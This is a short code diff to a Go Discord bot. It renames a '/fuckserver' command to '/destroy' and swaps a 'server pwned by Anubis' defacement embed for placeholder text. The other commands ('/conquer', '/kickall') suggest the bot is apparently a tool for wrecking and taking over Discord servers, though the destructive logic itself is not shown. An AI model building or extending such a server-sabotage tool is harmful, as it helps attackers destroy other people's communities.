@@ -46,8 +46,8 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 	// Handle specific command
 	switch m.Content {
-	case "/fuckserver":
-		fuckserver(s, m)
+	case "/destroy":
+		destroy(s, m)
 	case "/conquer":
 		conqueror(s, m)
 	case "/kickall":
@@ -66,8 +66,8 @@ func waitForShutdown() {
 	fmt.Println("Shutting down bot...")
 }
 
-func fuckserver(s *discordgo.Session, m *discordgo.MessageCreate) {
-	fmt.Println("Command received: /fuckserver")
+func destroy(s *discordgo.Session, m *discordgo.MessageCreate) {
+	fmt.Println("Command received: /destroy")
 
 	// Get Guild ID
 	guildhandler := m.GuildID
@@ -102,10 +102,10 @@ func fuckserver(s *discordgo.Session, m *discordgo.MessageCreate) {
 func conqueror(s *discordgo.Session, m *discordgo.MessageCreate) {
 	guildID := m.GuildID
 	messagecontent := discordgo.MessageEmbed{
-		Title:       "Heads up, server pwned by Anubis!",
-		Description: "Server has been compromised. See the image below for details.",
+		Title:       "Cain",
+		Description: "Cain",
 		Image: &discordgo.MessageEmbedImage{
-			URL: "https://imgur.com/a/pwned-PMdRZfU",
+			URL: "",
 		},
 		Color: 0xff0000, // Red color for the embed
 	}
